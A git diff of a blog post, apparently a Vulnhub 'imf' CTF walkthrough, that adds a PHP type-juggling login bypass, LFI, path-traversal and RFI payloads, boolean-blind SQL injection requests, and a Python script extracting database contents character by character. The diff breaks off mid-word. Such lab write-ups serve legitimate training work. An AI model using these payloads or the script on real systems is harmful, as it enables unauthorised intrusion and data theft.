@@ -25,14 +25,14 @@ toc_sticky: true
 show_time: true
 ---
 
-imf, is a machine from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like theis machine 
+imf, is a machine from Vulnhub platform. I recommend you do these CTF because for the certfication called eCCptv2 the last machine will be something like this 
 
 
 **We will see all this from the perspective and methodology of a penetration test.**
 
 - Links to the machines: [imf](https://www.vulnhub.com/entry/imf-1,162/)
 - Difficulty assigned by Vulnhub: Medium
-- The IP of the machine in my case will be: 192.168.100.61 (You will have a different ip so change it for all steps)
+- The IP of the machine in my case will be: 192.168.100.52 (You will have a different ip so change it for all steps)
 
 Let's get them!
 
@@ -324,7 +324,6 @@ in this example i will use gobuster so
 
 ```bash
 gobuster dir -u http://192.168.100.52 -w //usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --add-slash
-
 ```
 output 
 
@@ -432,7 +431,7 @@ Password:
 
 ```
 
-it's a loggin panel let's find with the codigo fuente 
+it's a loggin panel let's find with the source code 
 
 
 ```bash
@@ -481,7 +480,7 @@ Connection: close
 user=asd&pass=asd
 
 ```
-seems that we can use a method called ```trugglin``` if is not sanitized  
+seems that we can use a method called ```typetruegglin``` if is not sanitized  
 
 let's try 
 
@@ -490,38 +489,22 @@ the attack consist in to add [] in the field of password and we found some possi
 ## Gaining Access
 
 ```php
-POST /imfadministrator/ HTTP/1.1
-
+POST /imfadministrator/index.php HTTP/1.1
 Host: 192.168.100.52
-
-Content-Length: 22
-
+Content-Length: 26
 Cache-Control: max-age=0
-
 Upgrade-Insecure-Requests: 1
-
 Origin: http://192.168.100.52
-
 Content-Type: application/x-www-form-urlencoded
-
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
-
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-
-Referer: http://192.168.100.52/imfadministrator/
-
+Referer: http://192.168.100.52/imfadministrator/index.php
 Accept-Encoding: gzip, deflate
-
 Accept-Language: es-419,es;q=0.9
-
 Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
-
 Connection: close
 
-
-
-user=rmichaels&pass[]=
-
+user=rmichaels&pass[]=test
 ```
 
 this can be explote it because is doing a comparison, 
@@ -559,31 +542,217 @@ take a look of the URL
 
 ```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
 
-is asking things to localhost
+is aiming to resources of the directory that is hosting the page because of ```=home```
 
 we can try a LFI to visualize content from the localhost
 
-```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+```http://192.168.100.52/imfadministrator/cms.php?pagename=/etc/passwd```
 
 we can try a Directory Path traversal to reaload a route from the local host
 
-```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+```http://192.168.100.52/imfadministrator/cms.php?pagename=../../../../.../../../../etc/passwd```
+
+we can try to add a null session to check if it's concateneting a extentions php or something like that
+
+```http://192.168.100.52/imfadministrator/cms.php?pagename=../../../../.../../../../etc/passwd%00``` with the null session what we would do would be to become independent ```%00```
+
 
 we can try a RFI
 
+http://192.168.100.52/imfadministrator/cms.php?pagename=http://192.168.111.53/test
+
+and from our machine we have to stay listening at python3 -m http.server 80
+
 ```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
 
-and from our machine we have to stay listening at nc -nlvp  443
 
 
 to check if we receive data we can stay listing from I ens33 using wireShark 
 
+open wireshark and stay listening on interface ens33 to check if happened a three way handshake
+
+ejm 
+
+```wireshark &> /dev/null & disown```
+but we did not receive a three way handshake 
 
 
 we can try a SQLIN
 
-```http://192.168.100.52/imfadministrator/cms.php?pagename=home```
+```http://192.168.100.52/imfadministrator/cms.php?pagename=home'1 ```
 
+
+output 
+
+```php
+IMF CMS
+Menu: Home | Upload Report | Disavowed list | Logout
+
+
+Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
+```
 it seems that the shots are aimed at exploiting SQL
 
+let's try 
 
+seems that it has the vulnerability of base blind SQLIN with conditional responses 
+
+it means when you  add something that is true appears ```Welcome to the IMF Administration.```
+
+here's and example adding a true information 
+
+```php
+GET /imfadministrator/cms.php?pagename=home'and '1'='1 HTTP/1.1
+Host: 192.168.100.52
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
+Connection: close
+```
+
+here's an example by adding something that is not true 
+
+```php
+GET /imfadministrator/cms.php?pagename=home'and '1'='2 HTTP/1.1
+Host: 192.168.100.52
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
+Connection: close
+```
+
+remember to url encode the request
+
+here's the response from this page
+```php
+HTTP/1.1 200 OK
+Date: Sat, 06 May 2023 15:57:59 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 285
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<title>IMF CMS</title>
+</head>
+<body>
+<h1>IMF CMS</h1>
+Menu: 
+<a href='cms.php?pagename=home'>Home</a> | 
+<a href='cms.php?pagename=upload'>Upload Report</a> | 
+<a href='cms.php?pagename=disavowlist'>Disavowed list</a> | 
+Logout
+<br /><br/>
+</body>
+</html>
+
+```
+
+as you can see i am able to execute true or bad requests
+
+let's try to find a possible data from the page 
+
+first we have to find 
+
+the tables
+
+we will inject this string 
+```bash
+' and (select substring(schema_name,1,1) from information_schema.schemata limit 0,1)='i
+```
+
+where: 
+
+```bash 
+' and: This is a character string used to concatenate a WHERE clause with the SQL query. The presence of this character string indicates that a WHERE clause is being added to the SQL query.
+
+(select substring: This indicates that a subquery is being performed within the main query. The subquery uses the substring function to extract a substring from another string.
+
+(schema_name,1,1): This is the string from which a substring is to be extracted. In this case, the first character of each schema name in the information_schema.schemata table is being extracted. If we want to play with positions in the data table, we would indicate (schema_name,2,1) because the first table is almost always the information schema, then the 2 would refer to filtering the second character of the information schema table where we would change the search instead of ='i it would be ='n. Another important thing to mention is that if we want to filter by another table, we would change the value to (schema_name,1,2), where we would filter by the first word of the 2nd table.
+
+from information_schema.schemata: This indicates that information is being selected from the information_schema.schemata table. This table contains information about schemas in the database.
+
+limit 0,1): This limits the number of rows returned in the query. In this case, the query is limited to the first row found in the table.
+
+='i: This specifies that we want to filter by the first word. Since we're using a limit of 0,1, we'll have to tell it that we want to filter in our case it would be 'i' since we're trying to search for the information_schema.schemata table.
+
+```
+
+being said that we will proceed to filter 
+
+the lenght of each DBS, Tables, Columns
+
+to make a python script 
+
+```python 
+#!/usr/bin/python3
+
+from pwn import *
+import requests, pdb, signal, time, sys, string
+
+def def_handler(sig,frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+#Variables Globales
+main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
+characters = string.ascii_lowercase + '-_'
+
+
+def makeRequest():
+
+    cookies = {'PHPSESSID': 'u85u4l0h0cho9ug97gqspsubp3'}
+
+    database = ""
+    p1 =log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Databases")
+
+
+    for dbs in range(0, 6):
+        for position_character in range(1, 30): 
+            for character in characters:
+                sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
+
+                p1.status(sqli)
+
+                r = requests.get(sqli, cookies=cookies)
+
+                if "Welcome to the IMF Administration." in r.text:
+                    database += character
+                    p2.status(database)
+                    break
+
+    database += ","
+
+if __name__ == '__main__':
+
+    makeRequest()
+
+
+```
+
+
+where:
+
+exp
